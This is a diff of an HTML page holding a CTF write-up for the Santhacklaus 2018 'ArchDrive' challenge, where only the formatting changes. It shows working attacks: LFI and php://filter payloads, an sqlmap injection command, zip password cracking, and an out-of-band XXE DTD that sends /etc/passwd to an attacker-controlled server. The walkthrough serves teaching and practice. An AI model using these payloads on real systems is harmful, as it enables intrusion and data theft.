@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.72.0" />
+<meta name="generator" content="Hugo 0.90.1" />
 
   <meta property="og:title" content="[CTF - Santhacklaus-2018] ArchDrive" />
 <meta property="og:description" content="" />
@@ -59,10 +59,11 @@
   <script src="https://thibaud-robin.fr/js/lightbox.min.js"></script>
   <script src="https://thibaud-robin.fr/js/termynal.js"></script>
   <script src="https://thibaud-robin.fr/js/emojify.min.js"></script>
-  
+
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/termynal.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/hover.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/emojify.min.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/darkreader.css">
 
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133286401-1"></script>
@@ -230,10 +231,10 @@
 <p>Ok, the forgot password page is not really usefull. You can&rsquo;t enumerate some account, there is always the same message : <code>Email sent !</code>. But look further ! Look at the url and specifically to the arguments page. Look familiar to a vulnerability : Local File Inclusion. What it is a LFI ? Look at OWASP description : <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</a></p>
 <p><code>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &quot;dynamic file inclusion&quot; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</code></p>
 <p>There is below a vulnerable code to LFI. It’s really easy to prevent this type of vulnerability by adding some permissions checks before including the file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
     <span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]); 
-<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>How can I check if this application is vulnerable to LFI. Really easy, just read the OWASP Guide : <code>http://vulnerable_host/preview.php?file=../../../../etc/passwd</code>. So for us, the example become : <a href="https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd">https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd</a>. If the server is an unix server, it will display the content of /etc/passwd, so all users of the server.</p>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>How can I check if this application is vulnerable to LFI. Really easy, just read the OWASP Guide : <code>http://vulnerable_host/preview.php?file=../../../../etc/passwd</code>. So for us, the example become : <a href="https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd">https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd</a>. If the server is an unix server, it will display the content of /etc/passwd, so all users of the server.</p>
 <p><img src="/img/santhacklaus/arch5.png" alt="" title=""></p>
 <p>It works ! Congratz dude ! Look carefully to the last line. There is some great informations :</p>
 <ul>
@@ -245,7 +246,7 @@
 <p>We&rsquo;ve got a nice LFI. What can we do with LFI ? Execute some code, read some files and many more&hellip; I&rsquo;m a curious guy. I always want to know how developers made their applications. When you read the source code of <code>index.php</code>, you discover two others php pages : <code>login.php</code> and <code>reset.php</code>. So let&rsquo;s obtain all the source code !</p>
 <p>I can recommend you the Swissky CheatSheets : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>. Scroll to File Inclusion section : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal</a></p>
 <p>On this sheet, you have all you need to exploit a LFI. How can I extract the application source code ? With php wrappers of course ! Some examples :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
@@ -261,7 +262,7 @@ http://example.com/index.php?page=php://filter/bzip2.compress/convert.base64-enc
 <p>Well done ! This the base64 code of the <code>reset.php</code> page. Let&rsquo;s decode this. As you can see, the data is not compressed (maybe file is too light) so you juste have to decode it.</p>
 <p><img src="/img/santhacklaus/arch8.png" alt="" title=""></p>
 <p>We have some PHP code, sounds great !</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?php session_start(); ?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?php session_start(); ?&gt;</span>
 <span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
 &lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
    &lt;<span style="color:#f92672">head</span>&gt;
@@ -310,7 +311,7 @@ http://example.com/index.php?page=php://filter/bzip2.compress/convert.base64-enc
    &lt;/<span style="color:#f92672">body</span>&gt;
 &lt;/<span style="color:#f92672">html</span>&gt;
 </code></pre></div><p>Nothing really usefull with the reset page. Maybe more in the login page.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">session_start</span>();
 $state <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
 
@@ -347,8 +348,8 @@ $state <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</spa
         }
     }
 }
-<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>There are severals interestings things here :</p>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>There are severals interestings things here :</p>
 <ul>
 <li>Database credentials but useless because the database works on internal server (172.17.0.11 - saw in /etc/hosts)</li>
 <li>Vulnerable code</li>
@@ -363,8 +364,8 @@ $state <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</spa
     </p>
 </div>
 <p>If you look closer to the code, you see a huge mistake. Look at this 2 lines :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$user = mysqli_real_escape_string($bdd, strtolower($_POST[&#39;email&#39;]));
-$pass = $_POST[&#39;pass&#39;];
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_real_escape_string</span>($bdd, <span style="color:#a6e22e">strtolower</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]));
+$pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
 </code></pre></div><p>The developper sanitize the <code>$user</code> variable but forgot to sanitize the <code>$pass</code> variable. Too bad, suddenly it&rsquo;s possible to do some sql injection on the field password in the login form. But if you read the source code, you must have the good username. When you watch carefully the html code of <code>reset.php</code> you can clearly read <code>Email (only from @archdrive.corp)</code>. So we can guess a correct email could be <code>g0ld3n_us3r@archdrive.corp</code> (referer to the /etc/passwd file). So let&rsquo;s try this !</p>
 <p><img src="/img/santhacklaus/arch9.png" alt="" title="">
 <img src="/img/santhacklaus/arch10.png" alt="" title=""></p>
@@ -375,7 +376,7 @@ $pass = $_POST[&#39;pass&#39;];
     
     </p>
 </div>
-<pre><code>csqlmap -u &quot;https://archdrive.santhacklaus.xyz/login.php&quot; --data &quot;email=a@b.c&amp;pass=password&quot; -p &quot;pass&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
+<pre tabindex="0"><code>csqlmap -u &quot;https://archdrive.santhacklaus.xyz/login.php&quot; --data &quot;email=a@b.c&amp;pass=password&quot; -p &quot;pass&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
         ___
        __H__
  ___ ___[&quot;]_____ ___ ___  {1.2.11#stable}
@@ -417,7 +418,7 @@ Table: access-users
 +----+----------------------------+------------------------------------------------------------------+
 </code></pre><p>I will not explain here how Sqlmap work, but you can easily understand the command with Sqlmap documentation. The password is the plain password non hashed (I know it look like sha256)</p>
 <p>So you can now access to the storage. There is an amount of useless files. The archive <code>CONFIDENTIEL.zip</code> is a trap. Be focus on the encrypted archive <code>recup.zip</code>.</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ unzip recup.zip 
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ unzip recup.zip 
 Archive:  recup.zip
 [recup.zip] password.txt password: 
 
@@ -429,12 +430,12 @@ Archive:  recup.zip
 ---------                     -------
       377                     1 file
 </code></pre><p>Maybe the archive password is weak ? Try to break it with bruteforce attack with fcrackzip. Don&rsquo;t forget -u !</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
 found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)
 
 PASSWORD FOUND!!!!: pw == hackerman
 </code></pre><p>Nice ! So we can decompress the archive and read the content of <code>password.txt</code></p>
-<pre><code>=== FLAG ===
+<pre tabindex="0"><code>=== FLAG ===
 IMTLD{F1nd_Y0uR_W4y}
 
 ==== Facebook ===
@@ -467,7 +468,7 @@ Windobe123
 <p>If you look closer on files in the web storage, you can see an archive named <code>VeraCrypt.zip</code>. What is VeraCrypt ? Look at Wikipedia :</p>
 <p><code>VeraCrypt is a free and open-source utility used for on-the-fly encryption (OTFE). It can create a virtual encrypted disk within a file or encrypt a partition or (in Windows) the entire storage device with pre-boot authentication.</code></p>
 <p>So we should have some disk deciphering with VeraCrypt. Look at this 2 files download from the web storage : <code>media</code> and <code>documents</code>. 30Mb for one and 10Mb for the other. Really suspicious for a file. And look at the <code>password.txt</code> file, there is 3 passwords for VeraCrypt</p>
-<pre><code>=== VC ===
+<pre tabindex="0"><code>=== VC ===
 7Rex-Mazda0-hover1-Quid
 Gourd-crown2-gao4-warp2 - Take On Me
 0twain-Mao0-flash-6Goof-Gent
@@ -477,7 +478,7 @@ Gourd-crown2-gao4-warp2 - Take On Me
 <li>Password <code>7Rex-Mazda0-hover1-Quid</code> decrypt disk <code>media</code></li>
 <li>Password <code>0twain-Mao0-flash-6Goof-Gent</code> decrypt disk <code>documents</code></li>
 </ul>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ tree /mnt
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ tree /mnt
 |-- veracrypt1
 |   |-- $RECYCLE.BIN
 |   |   `-- desktop.ini
@@ -510,7 +511,7 @@ Gourd-crown2-gao4-warp2 - Take On Me
 <p><code>Keyfile is a file whose content is combined with a password (for information on the method used to combine a keyfile with password, see the section Keyfiles in the chapter Technical Details). Until the correct keyfile is provided, no volume that uses the keyfile can be mounted.</code></p>
 <p>Of course ! Why not to try to decipher a disk with a password AND a file ! This is the meaning of the 2nd password in the <code>password.txt</code> file. <code>Gourd-crown2-gao4-warp2</code> is the password and <code>Take On Me</code> the keyfile ! Try this on the first disk <code>media</code></p>
 <p><img src="/img/santhacklaus/arch13.png" alt="" title=""></p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ tree /mnt
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ tree /mnt
 /mnt
 |-- veracrypt1
     |-- $RECYCLE.BIN
@@ -525,17 +526,17 @@ Gourd-crown2-gao4-warp2 - Take On Me
         `-- WPSettings.dat
 </code></pre><p><img src="https://media.giphy.com/media/95ZYXmOCd9BBK/source.gif" alt=""></p>
 <p>OHOHOOHHO FU**** GODDD ! IT WORKS !!!</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ cat /mnt/veracrypt1/flag.txt
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ cat /mnt/veracrypt1/flag.txt
 IMTLD{I_h4v3_N0th1ng_T0_h1d3}
 </code></pre><p>Congrats dude ! You can go to the step 4 ! :)</p>
 <h2 id="4th-step---dive-in-blackhat-underground">4th step - Dive in BlackHat underground</h2>
 <p><img src="/img/santhacklaus/arch14.png" alt="" title=""></p>
 <p>If you look carefully to the files obtained at the last step, you will see an interesting archive : <code>Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip</code>. Unzip it !</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">Archive:  Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">Archive:  Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
   inflating: README.md               
   inflating: ticket.xml  
 </code></pre></div><p>This is the content of <code>README.md</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md"><span style="color:#75715e">### This ticket is the property of `Dark Lottery` ###
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md"><span style="color:#75715e">### This ticket is the property of `Dark Lottery` ###
 </span><span style="color:#75715e"></span>If you are not the buyer and if you found / stole this ticket, you must delete it immediately.
 This ticket is unique, do not share it.
 Remember to use it at your own risk.
@@ -544,7 +545,7 @@ Thank you for your purchase !
 
 --- scgz54b2lftqkkvn.onion ---
 </code></pre></div><p>And this is the content of ticket.xml</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
     <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
     <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
     <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
@@ -562,7 +563,7 @@ The website is really simple. There is 2 pages :</p>
 <p>This a game for us ! For blackhat like us ! Let&rsquo;s play the game and send our ticket.</p>
 <p><img src="/img/santhacklaus/arch17.png" alt="" title=""></p>
 <p>Humm. Yep ! There is a mistake is our xml. This is better</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
     <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
     <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
     <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
@@ -572,7 +573,7 @@ The website is really simple. There is 2 pages :</p>
 <p>Ho sad ! We lost ! :(
 Stop crying boy. Lets go pwn this illegal lottery to uphold the law.</p>
 <p>When I heard the word XML, I think immediately to XXE vulnerability. Indeed, this is the good way. Its always really annoying to display something when you do some XXE injection. The simple way is to execute a simple GET request from the victim server to your own server to detect the vulnerability. You will find below a really simple example.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
 
 <span style="color:#75715e">&lt;!DOCTYPE root [
 </span><span style="color:#75715e">    &lt;!ELEMENT root ANY &gt;</span>
@@ -587,7 +588,7 @@ Stop crying boy. Lets go pwn this illegal lottery to uphold the law.</p>
     <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
 <span style="color:#f92672">&lt;/ticket&gt;</span>
 </code></pre></div><p>On your server (here <code>12.34.56.78</code>) you just have to launch a listener (netcat, python, apache2, like you want&hellip;). I will choose python because it will be helpull later.</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
 51.75.202.113 - - [27/Dec/2018 23:18:20] &quot;GET / HTTP/1.0&quot; 200 -
 </code></pre><p>Alright ! We received a GET request just after send our ticket. So how can we go further now ?</p>
@@ -606,7 +607,7 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 </ol>
 <p>Still not clear ? See the example</p>
 <p>Here we have our malicious ticket. When the victim server will read this ticket, it will load the malicous code hosted on attacker&rsquo;s server</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
 
 <span style="color:#75715e">&lt;!DOCTYPE root [
 </span><span style="color:#75715e">    &lt;!ELEMENT root ANY &gt;</span>
@@ -623,10 +624,10 @@ Serving HTTP on 0.0.0.0 port 4444 ...
     <span style="color:#f92672">&lt;root&gt;</span>&amp;external;<span style="color:#f92672">&lt;/root&gt;</span>
 <span style="color:#f92672">&lt;/ticket&gt;</span>
 </code></pre></div><p>Here we have our malicious code : <code>exploit.dtd</code>. It will compress, base64 encode and send to the attacker&rsquo;s server the <code>/etc/passwd</code> file</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % data SYSTEM &#34;php://filter/read=bzip2.compress/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % data SYSTEM &#34;php://filter/read=bzip2.compress/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
 <span style="color:#75715e">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://12.34.56.78:4444/?data=%data;&#39;&gt;</span>&#34;&gt;
 </code></pre></div><p>And on the attacker’s server we receive the extracted data</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
 
 # This is the first GET request to obtain the malicious file
@@ -635,7 +636,7 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 # This is the second GET request with exfiltrate data (here /etc/passwd)
 51.75.202.113 - - [27/Dec/2018 23:41:22] &quot;GET /?xxe=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg== HTTP/1.0&quot; 200 -                                             
 </code></pre><p>So now, I think you are pro base64 decoder :p</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==&quot; | base64 -d
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==&quot; | base64 -d
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -657,7 +658,7 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/bin/false
 </code></pre><p>Here is a nice python http server to gather our data to automate extraction task. Don&rsquo;t forget to grab a copy of <code>exploit.dtd</code> and <code>ticket.xml</code> (see above).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
